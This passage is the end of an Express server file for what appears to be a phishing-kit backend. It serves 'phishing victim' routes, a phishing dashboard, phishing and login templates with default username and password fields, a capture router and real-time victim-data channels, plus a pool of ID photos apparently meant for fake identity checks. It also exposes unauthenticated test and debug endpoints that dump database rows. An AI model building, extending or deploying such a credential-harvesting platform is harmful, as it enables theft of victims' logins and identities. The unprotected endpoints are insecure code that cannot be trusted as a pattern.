    console.error('Delete bot error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete bot'
    });
  }
});

// ========== Security & Login History APIs ==========

// Get login history for current user
app.get('/api/user/login-history', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;

    const query = `
      SELECT id, ip_address, user_agent, device_type, browser, os, location,
             is_active, created_at, logged_out_at
      FROM login_history
      WHERE user_id = ?
      ORDER BY created_at DESC
      LIMIT 50
    `;

    const result = await executeQuery(query, [userId]);

    // Convert MySQL boolean integers (0/1) to actual booleans
    const formattedData = (result.data || []).map(session => ({
      ...session,
      is_active: Boolean(session.is_active),
      is_successful: Boolean(session.is_successful)
    }));

    res.json({
      status: 'success',
      data: formattedData
    });
  } catch (error) {
    console.error('Get login history error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch login history'
    });
  }
});

// Change password
app.put('/api/user/change-password', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;
    const { current_password, new_password } = req.body;

    if (!current_password || !new_password) {
      return res.status(400).json({
        status: 'error',
        message: 'Current and new passwords are required'
      });
    }

    // Get current password hash
    const userResult = await executeQuery('SELECT COALESCE(password_hash, password) as password_hash FROM users WHERE id = ?', [userId]);

    if (!userResult.success || userResult.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'User not found'
      });
    }

    const user = userResult.data[0];

    // Verify current password
    const isValidPassword = await comparePassword(current_password, user.password_hash);

    if (!isValidPassword) {
      return res.status(400).json({
        status: 'error',
        message: 'Current password is incorrect'
      });
    }

    // Hash new password
    const hashedPassword = await hashPassword(new_password);

    // Update password
    const updateResult = await executeQuery(
      'UPDATE users SET password_hash = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
      [hashedPassword, userId]
    );

    if (updateResult.success) {
      res.json({
        status: 'success',
        message: 'Password changed successfully'
      });
    } else {
      throw new Error('Failed to update password');
    }
  } catch (error) {
    console.error('Change password error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to change password'
    });
  }
});

// Blacklist IP address
app.post('/api/user/blacklist-ip', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;
    const { ip_address } = req.body;

    if (!ip_address) {
      return res.status(400).json({
        status: 'error',
        message: 'IP address is required'
      });
    }

    console.log(`🚫 Attempting to block IP ${ip_address} for user ${userId}`);

    // Add IP to blacklist
    const query = `
      INSERT INTO ip_blacklist (user_id, ip_address, created_by, reason)
      VALUES (?, ?, ?, 'Blocked by user')
      ON DUPLICATE KEY UPDATE created_at = CURRENT_TIMESTAMP
    `;

    const blacklistResult = await executeQuery(query, [userId, ip_address, userId]);
    console.log(`🚫 Blacklist query result:`, blacklistResult);

    // Automatically logout all sessions from this IP
    const logoutQuery = `
      UPDATE login_history
      SET is_active = 0, logged_out_at = CURRENT_TIMESTAMP
      WHERE user_id = ? AND ip_address = ? AND is_active = 1
    `;

    console.log(`🚫 Running logout query for user ${userId}, IP ${ip_address}`);
    const logoutResult = await executeQuery(logoutQuery, [userId, ip_address]);

    console.log(`🚫 Logout query result:`, logoutResult);
    console.log(`✅ IP ${ip_address} blocked for user ${userId}. Logged out ${logoutResult.data?.affectedRows || 0} active sessions.`);

    res.json({
      status: 'success',
      message: `IP address blocked and ${logoutResult.data?.affectedRows || 0} sessions logged out successfully`,
      loggedOutSessions: logoutResult.data?.affectedRows || 0
    });
  } catch (error) {
    console.error('❌ Blacklist IP error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to block IP'
    });
  }
});

// Unblock IP address
app.delete('/api/user/blacklist-ip/:ipAddress', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;
    const ipAddress = decodeURIComponent(req.params.ipAddress);

    console.log(`🔓 Attempting to unblock IP ${ipAddress} for user ${userId}`);

    const query = `
      DELETE FROM ip_blacklist
      WHERE user_id = ? AND ip_address = ?
    `;

    const result = await executeQuery(query, [userId, ipAddress]);

    if (result.success && result.data.affectedRows > 0) {
      console.log(`✅ IP ${ipAddress} unblocked successfully for user ${userId}`);
      res.json({
        status: 'success',
        message: 'IP address unblocked successfully'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'IP address not found in blacklist'
      });
    }
  } catch (error) {
    console.error('❌ Unblock IP error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to unblock IP'
    });
  }
});

// Delete login history entry
app.delete('/api/user/login-history/:sessionId', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;
    const sessionId = req.params.sessionId;

    const query = `
      DELETE FROM login_history
      WHERE id = ? AND user_id = ?
    `;

    const result = await executeQuery(query, [sessionId, userId]);

    if (result.success && result.data.affectedRows > 0) {
      res.json({
        status: 'success',
        message: 'Login history deleted successfully'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Login history not found'
      });
    }
  } catch (error) {
    console.error('Delete login history error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete login history'
    });
  }
});

// ========== ID Photos APIs ==========

// Config multer for ID photos upload
const idPhotosStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = path.join(__dirname, 'uploads', 'id-photos');
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueName = `id-photo-${Date.now()}-${Math.floor(Math.random() * 1000000)}${path.extname(file.originalname)}`;
    cb(null, uniqueName);
  }
});

const idPhotosUpload = multer({
  storage: idPhotosStorage,
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed'));
    }
  }
});

// Get random ID photos (User)
app.get('/api/id-photos/random', authenticateUser, async (req, res) => {
  try {
    const { gender = 'all', limit = 6 } = req.query;

    let query = 'SELECT id, filename, file_url, gender, downloads FROM id_photos';
    const params = [];

    if (gender !== 'all') {
      query += ' WHERE gender IN (?, "unisex")';
      params.push(gender);
    }

    query += ' ORDER BY RAND() LIMIT ?';
    params.push(parseInt(limit));

    const result = await executeQuery(query, params);

    res.json({
      status: 'success',
      data: result.data || []
    });
  } catch (error) {
    console.error('Get random photos error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch photos'
    });
  }
});

// Track download
app.post('/api/id-photos/:id/download', authenticateUser, async (req, res) => {
  try {
    const photoId = req.params.id;

    await executeQuery('UPDATE id_photos SET downloads = downloads + 1 WHERE id = ?', [photoId]);

    res.json({ status: 'success' });
  } catch (error) {
    console.error('Track download error:', error);
    res.status(500).json({ status: 'error' });
  }
});

// Get all ID photos (Admin)
app.get('/api/admin/id-photos', authenticateUser, async (req, res) => {
  try {
    const { gender } = req.query;

    let query = `
      SELECT p.*, u.username as uploader
      FROM id_photos p
      LEFT JOIN users u ON p.uploaded_by = u.id
    `;
    const params = [];

    if (gender && gender !== 'all') {
      query += ' WHERE p.gender = ?';
      params.push(gender);
    }

    query += ' ORDER BY p.created_at DESC';

    const result = await executeQuery(query, params);

    res.json({
      status: 'success',
      data: result.data || []
    });
  } catch (error) {
    console.error('Get admin photos error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch photos'
    });
  }
});

// Upload ID photos (Admin) - Multiple files
app.post('/api/admin/id-photos/upload', authenticateUser, idPhotosUpload.array('photos', 50), async (req, res) => {
  try {
    const userId = req.user.id;
    const { gender = 'unisex' } = req.body;

    if (!req.files || req.files.length === 0) {
      return res.status(400).json({
        status: 'error',
        message: 'No photos uploaded'
      });
    }

    const uploadedPhotos = [];

    for (const file of req.files) {
      const filePath = `uploads/id-photos/${file.filename}`;
      const fileUrl = `${req.protocol}://${req.get('host')}/${filePath}`;

      const query = `
        INSERT INTO id_photos (filename, file_path, file_url, gender, file_size, mime_type, uploaded_by)
        VALUES (?, ?, ?, ?, ?, ?, ?)
      `;

      const result = await executeQuery(query, [
        file.filename,
        filePath,
        fileUrl,
        gender,
        file.size,
        file.mimetype,
        userId
      ]);

      if (result.success) {
        uploadedPhotos.push({ id: result.data.insertId, filename: file.filename });
      }
    }

    res.json({
      status: 'success',
      message: `${uploadedPhotos.length} photos uploaded successfully`,
      data: uploadedPhotos
    });
  } catch (error) {
    console.error('Upload photos error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to upload photos'
    });
  }
});

// Delete ID photo (Admin)
app.delete('/api/admin/id-photos/:id', authenticateUser, async (req, res) => {
  try {
    const photoId = req.params.id;

    // Get photo info to delete file
    const photoResult = await executeQuery('SELECT file_path FROM id_photos WHERE id = ?', [photoId]);

    if (photoResult.success && photoResult.data.length > 0) {
      const photo = photoResult.data[0];
      const fullPath = path.join(__dirname, photo.file_path);

      // Delete from database
      await executeQuery('DELETE FROM id_photos WHERE id = ?', [photoId]);

      // Delete file
      if (fs.existsSync(fullPath)) {
        fs.unlinkSync(fullPath);
      }

      res.json({
        status: 'success',
        message: 'Photo deleted successfully'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Photo not found'
      });
    }
  } catch (error) {
    console.error('Delete photo error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete photo'
    });
  }
});

// Add API routes
app.use('/api/templates', templateFieldsRouter);
app.use('/api/capture', captureRouter);

// Template Images Gallery API endpoints
// Upload image to template gallery
app.post('/api/template-images/upload', authenticateToken, templateImageUpload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({
        status: 'error',
        message: 'No image file uploaded'
      });
    }

    const userId = req.user.id;
    const filePath = `uploads/template-images/${req.file.filename}`;
    const fileUrl = `${req.protocol}://${req.get('host')}/${filePath}`;

    // Save to database
    const result = await executeQuery(
      `INSERT INTO template_images (user_id, filename, original_name, file_path, file_size, mime_type) 
       VALUES (?, ?, ?, ?, ?, ?)`,
      [
        userId,
        req.file.filename,
        req.file.originalname,
        filePath,
        req.file.size,
        req.file.mimetype
      ]
    );

    if (!result.success) {
      throw new Error(result.error || 'Database insert failed');
    }

    console.log('📷 Template image uploaded:', {
      id: result.data.insertId,
      originalName: req.file.originalname,
      filename: req.file.filename,
      size: req.file.size,
      userId: userId
    });

    res.json({
      status: 'success',
      message: 'Image uploaded successfully',
      data: {
        id: result.data.insertId,
        filename: req.file.filename,
        originalName: req.file.originalname,
        path: filePath,
        url: fileUrl,
        size: req.file.size,
        mimeType: req.file.mimetype,
        uploadedAt: new Date().toISOString()
      }
    });
  } catch (error) {
    console.error('Template image upload error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to upload image'
    });
  }
});

// Get template images for current user
app.get('/api/template-images', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;

    // Create table if not exists
    await executeQuery(`
      CREATE TABLE IF NOT EXISTS template_images (
        id INT AUTO_INCREMENT PRIMARY KEY,
        user_id INT NOT NULL,
        filename VARCHAR(255) NOT NULL,
        original_name VARCHAR(255) NOT NULL,
        file_path VARCHAR(500) NOT NULL,
        file_size BIGINT NOT NULL,
        mime_type VARCHAR(100) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_user_id (user_id),
        INDEX idx_created_at (created_at)
      )
    `);

    // Get images for current user
    const result = await executeQuery(
      'SELECT * FROM template_images WHERE user_id = ? ORDER BY created_at DESC',
      [userId]
    );

    if (!result.success) {
      throw new Error(result.error || 'Database query failed');
    }

    const images = result.data || [];

    // Format response data
    const formattedImages = images.map(image => ({
      id: image.id,
      filename: image.filename,
      originalName: image.original_name,
      path: image.file_path,
      url: `${req.protocol}://${req.get('host')}/${image.file_path}`,
      size: image.file_size,
      mimeType: image.mime_type,
      uploadedAt: image.created_at,
      modifiedAt: image.updated_at
    }));

    res.json({
      status: 'success',
      data: formattedImages
    });
  } catch (error) {
    console.error('Get template images error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to retrieve images'
    });
  }
});

// Delete template image
app.delete('/api/template-images/:id', authenticateToken, async (req, res) => {
  try {
    const { id } = req.params;
    const userId = req.user.id;

    // Get image info from database
    const result = await executeQuery(
      'SELECT * FROM template_images WHERE id = ? AND user_id = ?',
      [id, userId]
    );

    if (!result.success) {
      throw new Error(result.error || 'Database query failed');
    }

    const images = result.data || [];

    if (images.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Image not found or you do not have permission to delete it'
      });
    }

    const image = images[0];
    const filePath = path.join(__dirname, image.file_path);

    // Delete file from filesystem
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }

    // Delete from database
    await executeQuery(
      'DELETE FROM template_images WHERE id = ? AND user_id = ?',
      [id, userId]
    );

    console.log('🗑️ Template image deleted:', {
      id: image.id,
      filename: image.filename,
      userId: userId
    });

    res.json({
      status: 'success',
      message: 'Image deleted successfully'
    });
  } catch (error) {
    console.error('Delete template image error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete image'
    });
  }
});

// Rename template image
app.put('/api/template-images/:id/rename', authenticateToken, async (req, res) => {
  try {
    const { id } = req.params;
    const { newName } = req.body;
    const userId = req.user.id;

    if (!newName || newName.trim().length === 0) {
      return res.status(400).json({
        status: 'error',
        message: 'New name is required'
      });
    }

    // Get image info from database
    const result = await executeQuery(
      'SELECT * FROM template_images WHERE id = ? AND user_id = ?',
      [id, userId]
    );

    if (!result.success) {
      throw new Error(result.error || 'Database query failed');
    }

    const images = result.data || [];

    if (images.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Image not found or you do not have permission to rename it'
      });
    }

    const image = images[0];
    const sanitizedNewName = newName.replace(/[^a-zA-Z0-9.-]/g, '_').substring(0, 100);

    // Update database
    await executeQuery(
      'UPDATE template_images SET original_name = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ? AND user_id = ?',
      [sanitizedNewName, id, userId]
    );

    console.log('📝 Template image renamed:', {
      id: image.id,
      oldName: image.original_name,
      newName: sanitizedNewName,
      userId: userId
    });

    res.json({
      status: 'success',
      message: 'Image renamed successfully',
      data: {
        id: image.id,
        oldName: image.original_name,
        newName: sanitizedNewName,
        url: `${req.protocol}://${req.get('host')}/${image.file_path}`
      }
    });
  } catch (error) {
    console.error('Rename template image error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to rename image'
    });
  }
});

// Error handler (must use 4 args so Express treats it as error middleware)
// eslint-disable-next-line no-unused-vars
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({
    status: 'error',
    message: 'Internal server error'
  });
});

// SPA fallback - serve index.html for all non-API routes (but skip static files and phishing routes)
app.use((req, res, next) => {
  console.log('🔍 SPA fallback middleware hit:', req.path);

  // Skip API routes - let them be handled by their specific routes
  if (req.path.startsWith('/api/')) {
    console.log('⏭️ Skipping API route:', req.path);
    return next();
  }

  // Skip static file routes - let them be handled by static middleware
  if (req.path.startsWith('/assets/') || req.path.startsWith('/images/') || req.path.startsWith('/uploads/')) {
    console.log('⏭️ Skipping static file route:', req.path);
    return next();
  }

  // Skip phishing victim routes - let them be handled by their specific routes
  if (req.path.startsWith('/p/')) {
    console.log('⏭️ Skipping phishing victim route:', req.path);
    return next();
  }

  // Handle phishing dashboard routes - these should be handled by SPA
  if (req.path.startsWith('/phishing/')) {
    console.log('📄 Serving index.html for phishing route:', req.path);
    return res.sendFile(path.join(__dirname, 'dist', 'index.html'));
  }

  // Skip WebSocket routes - let them be handled by WebSocket server
  if (req.path.startsWith('/ws/')) {
    console.log('⏭️ Skipping WebSocket route:', req.path);
    return next();
  }

  console.log('📄 Serving index.html for:', req.path);
  // Serve index.html for all other routes (SPA routing)
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// Test website creation endpoint (bypass auth for testing)
app.post('/api/test/create-website', async (req, res) => {
  try {
    const {
      title = 'Test Website',
      description = 'Test description',
      slug = `test-${Date.now()}`,
      redirect_url = 'https://google.com',
      temp1 = '<html>Test phishing</html>',
      temp2 = '<html>Test login</html>',
      thumbnail = '',
      language = 'en',
      domain = ''
    } = req.body;

    const userId = 1; // Test user ID

    console.log('🧪 Testing website creation with data:', {
      title, slug, userId
    });

    // Check if slug already exists
    const existingSlug = await executeQuery(
      'SELECT id FROM websites WHERE slug = ?',
      [slug]
    );

    if (existingSlug.success && existingSlug.data.length > 0) {
      return res.status(400).json({
        status: 'error',
        message: 'Slug already exists'
      });
    }

    // Try inserting with fallback logic
    let result;
    try {
      console.log('🔄 Trying new schema...');
      result = await executeQuery(`
        INSERT INTO websites (title, description, slug, redirect_url, temp1, temp2, phishing_template_id, login_template_id, thumbnail, language, domain, user_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `, [title, description, slug, redirect_url, temp1, temp2, null, null, thumbnail, language, domain, userId]);
      console.log('✅ New schema worked:', result);
    } catch (error) {
      console.log('⚠️  New schema failed, trying legacy:', error.message);
      result = await executeQuery(`
        INSERT INTO websites (title, description, slug, redirect_url, temp1, temp2, thumbnail, language, domain, user_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `, [title, description, slug, redirect_url, temp1, temp2, thumbnail, language, domain, userId]);
      console.log('🔄 Legacy schema result:', result);
    }

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Test website created successfully',
        data: {
          id: result.data.insertId,
          slug: slug,
          url: `http://localhost:3001/phishing/${slug}`
        }
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to create website',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Test create website error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Test failed',
      error: error.message
    });
  }
});

// Debug websites table endpoint
app.get('/api/debug/websites-table', async (req, res) => {
  try {
    console.log('🔍 Debugging websites table...');

    // Check if websites table exists
    const tablesResult = await executeQuery("SHOW TABLES LIKE 'websites'");
    console.log('📋 Tables check result:', tablesResult);

    let response = {
      status: 'success',
      tableExists: false,
      schema: null,
      sampleData: null,
      errors: []
    };

    if (tablesResult.success && tablesResult.data && tablesResult.data.length > 0) {
      response.tableExists = true;
      console.log('✅ Websites table exists');

      // Get table structure
      const schemaResult = await executeQuery('DESCRIBE websites');
      if (schemaResult.success) {
        response.schema = schemaResult.data;
        console.log('🔍 Table schema:', schemaResult.data?.map(col => `${col.Field}: ${col.Type}`));

        // Check for new columns
        const hasPhishingTemplateId = schemaResult.data?.some(col => col.Field === 'phishing_template_id');
        const hasLoginTemplateId = schemaResult.data?.some(col => col.Field === 'login_template_id');

        response.hasNewColumns = {
          phishing_template_id: hasPhishingTemplateId,
          login_template_id: hasLoginTemplateId
        };

        console.log('🆔 New columns check:', {
          phishing_template_id: hasPhishingTemplateId,
          login_template_id: hasLoginTemplateId
        });

        // Get sample data
        const sampleResult = await executeQuery('SELECT * FROM websites LIMIT 3');
        if (sampleResult.success) {
          response.sampleData = sampleResult.data;
        }
      } else {
        response.errors.push('Failed to get table schema: ' + schemaResult.error);
      }
    } else {
      console.log('❌ Websites table does not exist');
      response.errors.push('Websites table does not exist');
    }

    res.json(response);
  } catch (error) {
    console.error('Debug endpoint error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Debug failed',
      error: error.message
    });
  }
});

// Start server
// eslint-disable-next-line no-unused-vars
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
  console.log(`🔍 Database test: http://localhost:${PORT}/api/db-test`);
  console.log(`🌐 Frontend: http://localhost:${PORT}`);
  console.log(`🌐 API: http://localhost:${PORT}/api`);
  console.log(`📝 To access from domain, configure reverse proxy or deploy to domain`);
});

// Initialize Pusher
console.log('🔧 Pusher initialized for real-time updates');

// Test endpoint for sending Pusher data
app.post('/api/test/send-pusher-data', async (req, res) => {
  try {
    const { type, data, user_id } = req.body;

    if (!type || !data) {
      return res.status(400).json({
        status: 'error',
        message: 'Missing type or data'
      });
    }

    // Determine channel - use user-specific if user_id provided, otherwise fallback to general
    const channel = user_id ? `phishing-dashboard-user-${user_id}` : 'phishing-dashboard';

    // Send via Pusher
    pusher.trigger(channel, type, {
      type: type,
      data: data
    });

    console.log(`📡 Sent Pusher event: ${type} to channel: ${channel}`);

    res.json({
      status: 'success',
      message: 'Data sent via Pusher',
      type: type
    });

  } catch (error) {
    console.error('Error sending Pusher data:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to send Pusher data',
      error: error.message
    });
  }
});

// Get template fields by website ID
app.get('/api/template-fields/:websiteId', async (req, res) => {
  try {
    const { websiteId } = req.params;

    // Set headers to prevent caching
    res.set({
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0'
    });

    console.log(`🔍 Fetching template fields for website ID: ${websiteId}`);

    // Get website info to find template ID
    const websiteQuery = `
      SELECT id, title, phishing_template_id, login_template_id 
      FROM websites 
      WHERE id = ?
    `;

    const websiteResult = await executeQuery(websiteQuery, [websiteId]);

    console.log(`🔍 Website query result for ID ${websiteId}:`, websiteResult);

    if (!websiteResult || !websiteResult.success || !websiteResult.data || websiteResult.data.length === 0) {
      console.log(`❌ Website ${websiteId} not found in database`);
      // Return default fields instead of error
      const defaultFields = [
        {
          id: 1,
          name: 'Username',
          type: 'text',
          required: true,
          placeholder: 'Username',
          maxLength: 255,
          order: 0
        },
        {
          id: 2,
          name: 'Password',
          type: 'password',
          required: true,
          placeholder: 'Password',
          maxLength: 255,
          order: 1
        }
      ];

      return res.json({
        success: true,
        data: {
          templateId: 4,
          websiteId: parseInt(websiteId),
          websiteTitle: 'Unknown Website',
          fields: defaultFields
        }
      });
    }

    const website = websiteResult.data[0];
    // Use login_template_id if available, otherwise use phishing_template_id, otherwise default to 4
    const templateId = website.login_template_id || website.phishing_template_id || 4;

    console.log(`🔍 Website ${websiteId}: title="${website.title}", phishing_template_id=${website.phishing_template_id}, login_template_id=${website.login_template_id}, using template_id=${templateId}`);

    // Get template fields from database
    const fieldsQuery = `
      SELECT id, field_name, field_type, is_required, field_placeholder, max_length, field_order
      FROM template_fields 
      WHERE template_id = ? 
      ORDER BY field_order ASC
    `;

    const fieldsResult = await executeQuery(fieldsQuery, [templateId]);

    console.log(`🔍 Template fields query result for template ID ${templateId}:`, fieldsResult);

    // Format fields data
    let fields = [];
    if (fieldsResult && fieldsResult.success && fieldsResult.data && fieldsResult.data.length > 0) {
      fields = fieldsResult.data.map(field => ({
        id: field.id,
        name: field.field_name,
        type: field.field_type,
        required: Boolean(field.is_required),
        placeholder: field.field_placeholder || '',
        maxLength: field.max_length || 255,
        order: field.field_order || 0
      }));
      console.log(`✅ Found ${fields.length} real fields for template ${templateId}`);
    } else {
      // If no fields found, use default fields
      console.log(`⚠️ No fields found for template ${templateId}, using default fields`);
      fields = [
        {
          id: 1,
          name: 'Username',
          type: 'text',
          required: true,
          placeholder: 'Username',
          maxLength: 255,
          order: 0
        },
        {
          id: 2,
          name: 'Password',
          type: 'password',
          required: true,
          placeholder: 'Password',
          maxLength: 255,
          order: 1
        }
      ];
    }

    console.log(`📊 Fetched ${fields.length} fields for website ${websiteId}, template ${templateId}`);

    res.json({
      success: true,
      data: {
        templateId: templateId,
        websiteId: parseInt(websiteId),
        websiteTitle: website.title,
        fields: fields
      }
    });

  } catch (error) {
    console.error('Error fetching template fields:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Global error handlers
process.on('uncaughtException', (error) => {
  console.error('💥 Uncaught Exception:', error);
  console.error('Stack:', error.stack);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('💥 Unhandled Rejection at:', promise);
  console.error('Reason:', reason);
});

export default app;
